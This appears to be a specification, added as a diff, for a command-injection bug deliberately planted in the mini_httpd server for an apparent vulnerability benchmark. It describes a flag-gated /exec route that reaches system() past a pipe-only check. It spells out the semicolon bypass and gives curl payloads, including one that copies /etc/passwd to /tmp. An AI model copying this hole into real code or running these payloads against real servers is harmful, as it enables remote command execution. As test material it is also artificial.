@@ -1,0 +1,57 @@
+PACKAGE:     mini_httpd
+COMMIT:      6029ae04bd613ada00e0d9180dc063306c3a874f
+SOURCE:      /home/ubuntu/anthropic/corpus/mini_httpd/
+AXES:        C1 I3 S2
+
+DESCRIPTION:
+  CLI-flag-gated command injection with partial sanitization. The server must be
+  started with --exec-mode for the vulnerable endpoint to be reachable. A
+  user-supplied URL query parameter is dispatched through a struct before being
+  passed to system(), after a pipe character check that can be bypassed using
+  semicolons.
+
+CONFIG_GATE (C1 — simple):
+  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
+  check:      single boolean guard: `if ( exec_mode && strncmp( path, "/exec", 5 ) == 0 ... )`
+  complexity: one condition, one flag, no struct, no file parsing
+
+INPUT_FLOW (I3 — struct dispatch):
+  entry:      HTTP GET /exec?cmd=<payload>  →  global `query` (set by
+              handle_request() which splits on '?' and stores the right side)
+  path:       handle_request() dispatches to handle_exec()
+              handle_exec() populates an exec_args_t struct {cmd, flags},
+              passes it to dispatch_exec() which calls system(args->cmd)
+  transforms: none beyond the struct indirection — cmd pointer is unmodified
+
+SANITIZATION (S2 — rejects pipe, bypass with semicolon):
+  check:      `if ( strchr( cmd, '|' ) != (char*) 0 )` → send_error 400
+  bypass:     use ';' instead of '|' to chain commands:
+              cmd=id;cat%20/etc/passwd>/tmp/pwned  (semicolon not rejected)
+  or simply:  cmd=id>/tmp/pwned  (no pipe needed at all)
+
+SINK:        system(args->cmd) in dispatch_exec() (mini_httpd.c, injected before do_file)
+
+CHANGED FILES:
+  mini_httpd.c — 4 hunks:
+    1. globals:          added exec_mode after got_hup
+    2. forwards:         added handle_exec() forward declaration
+    3. main() argparse:  added else-if branch for --exec-mode before else usage()
+    4. handle_request(): added exec route check before strdecode(path,path)
+    5. handle_exec():    new function + dispatch_exec() helper with pipe check,
+                         inserted before do_file()
+
+EXPLOIT:
+  build:   bash build.sh
+  start:   ./mini_httpd -p 18039 -d /tmp/www -D --exec-mode
+  trigger: curl 'http://127.0.0.1:18039/exec?cmd=id>/tmp/pwned'
+  verify:  cat /tmp/pwned
+  expect:  uid=... line written by the server process
+
+  gate bypass: omitting --exec-mode causes /exec to return 404.
+
+NOTES:
+  - S2 only blocks the '|' character. The struct dispatch adds one level of
+    indirection but does not sanitize or transform the cmd string.
+  - The exec_args_t typedef is defined locally; dispatch_exec() is defined
+    just before handle_exec().
+  - The server is started with -D (debug/foreground) in the PoC.
